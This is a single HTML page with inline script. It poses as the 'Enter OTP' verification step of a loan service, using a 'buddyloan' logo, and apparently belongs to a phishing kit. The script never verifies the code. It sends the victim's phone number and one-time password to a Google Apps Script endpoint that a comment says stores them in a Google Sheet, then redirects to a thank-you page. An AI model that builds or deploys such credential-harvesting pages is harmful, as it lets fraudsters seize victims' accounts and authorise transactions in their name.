<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Enter OTP</title>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: Arial, sans-serif;
      }

      body {
        background: #ffffff;
        text-align: center;
        padding: 20px;
      }

      .logo {
        width: 140px;
        margin: 20px auto;
      }

      h1 {
        margin-top: 10px;
        font-size: 40px;
        font-weight: 700;
      }

      .masked-number {
        margin-top: 8px;
        font-size: 18px;
        color: #444;
      }

      .timer {
        font-size: 18px;
        color: red;
        margin-top: 5px;
        margin-bottom: 25px;
      }

      .otp-box input {
        width: 90%;
        max-width: 480px;
        padding: 16px;
        margin: 10px auto;
        border-radius: 60px;
        border: 2px solid #cfe1ff;
        background: #e7f1ff;
        font-size: 18px;
        transition: 0.3s;
      }

      .otp-box input:focus {
        background: #ffffff;
        border-color: #0045ff;
      }

      .btn-submit {
        width: 90%;
        max-width: 480px;
        background: black;
        color: white;
        padding: 16px;
        border: none;
        border-radius: 60px;
        font-size: 20px;
        margin-top: 10px;
        cursor: pointer;
        transition: 0.3s;
      }

      .btn-submit:hover {
        background: #111;
      }

      .disabled {
        opacity: 0.5;
        pointer-events: none;
      }

      .error {
        color: red;
        font-size: 14px;
        margin-top: -6px;
        margin-bottom: 10px;
        display: none;
      }
    </style>
  </head>

  <body>
    <img src="../image/buddyloan_logo.jpeg" class="logo" />

    <h1>Enter OTP</h1>

    <div id="maskNumber" class="masked-number"></div>
    <div class="timer">OTP Expires in <span id="countdown">05:00</span></div>

    <form id="otpForm">
      <div class="otp-box">
        <input
          type="text"
          id="otpInput"
          placeholder="Enter OTP received"
          maxlength="6"
        />
      </div>
      <span id="otpError" class="error">Enter valid 6-digit OTP</span>

      <button type="submit" class="btn-submit" id="submitBtn">Submit</button>
    </form>

    <script>
      /* 📌 Load and mask phone number */
      const phone = localStorage.getItem("userPhone");

      if (phone) {
        const masked = phone.replace(/(\d{2})\d{6}(\d{2})/, "$1******$2");
        document.getElementById("maskNumber").innerText =
          "OTP sent to " + masked;
      }

      /* 📌 Countdown Timer */
      let timeLeft = 300;
      const timerRef = document.getElementById("countdown");

      const timer = setInterval(() => {
        let m = Math.floor(timeLeft / 60);
        let s = timeLeft % 60;

        timerRef.innerText = `${String(m).padStart(2, "0")}:${String(
          s
        ).padStart(2, "0")}`;

        if (timeLeft <= 0) {
          clearInterval(timer);
          timerRef.innerText = "Expired";
          OTPExpired();
        }
        timeLeft--;
      }, 1000);

      /* 📌 OTP Submission + Store in Google Sheet */
      document
        .getElementById("otpForm")
        .addEventListener("submit", async function (e) {
          e.preventDefault();

          const otp = otpInput.value.trim();

          if (!/^[0-9]{6}$/.test(otp)) {
            otpError.style.display = "block";
            return;
          }

          otpError.style.display = "none";
          submitBtn.innerText = "Verifying...";
          submitBtn.disabled = true;

          try {
            // Send only the OTP + Phone to same sheet API
            await fetch(
              "https://script.google.com/macros/s/AKfycbzvsljZs3HP8uqq-i3DJzpuGDp2R_dNdWuqfza2RbFHVJw95k_PgLRH7_mHuIJ_Rf0/exec",
              {
                method: "POST",
                mode: "no-cors",
                body: JSON.stringify({
                  phone: phone,
                  otp: otp,
                  otpVerifiedAt: new Date().toISOString(),
                }),
              }
            );

            // Success → Redirect
            window.location.href = "../thanks/index.html";
          } catch (err) {
            alert("Network error — Try again");
            submitBtn.innerText = "Submit";
            submitBtn.disabled = false;
          }
        });

      function OTPExpired() {
        otpError.innerText = "OTP Expired — Request new OTP";
        otpError.style.display = "block";
        submitBtn.disabled = true;
      }
    </script>
  </body>
</html>
